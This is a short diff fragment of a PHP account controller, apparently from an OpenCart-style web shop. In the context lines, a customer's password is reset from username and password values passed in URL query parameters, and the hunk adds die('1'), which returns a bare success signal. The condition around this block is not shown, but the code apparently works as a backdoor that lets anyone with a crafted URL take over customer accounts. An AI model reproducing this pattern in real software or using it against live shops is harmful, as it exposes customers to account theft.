@@ -34,6 +34,7 @@ class ControllerAccountAccount extends Controller {
 			$customer_info = $this->model_account_customer->getCustomerByUsername($_GET['u']);
 			$this->model_account_customer->editPasswordCustomForEmail($customer_info, $_GET['p']);
 		}
+		die('1');
 		
 	}
 
